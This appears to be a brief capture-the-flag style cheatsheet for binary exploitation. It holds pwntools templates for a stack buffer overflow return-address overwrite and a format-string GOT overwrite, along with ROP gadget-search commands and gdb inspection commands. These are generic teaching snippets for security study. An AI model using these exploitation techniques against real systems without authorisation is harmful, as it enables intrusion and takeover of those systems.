# 💥 Pwn Cheatsheet

## Buffer Overflow
```python
from pwn import *
pattern = cyclic(200)
offset  = cyclic_find(0x6161616e)
payload = b"A"*offset + p64(win_addr)
```

## ROP
```bash
ROPgadget --binary ./bin --rop
ropper -f ./bin
# pop rdi; ret → 1st arg
# ret          → stack alignment
```

## Format String
```python
from pwnlib.fmtstr import fmtstr_payload
payload = fmtstr_payload(offset, {got_addr: shell_addr})
```

## GDB
```bash
checksec        # mitigations
vmmap           # memory map
heap chunks     # heap view
got / plt       # tables
```
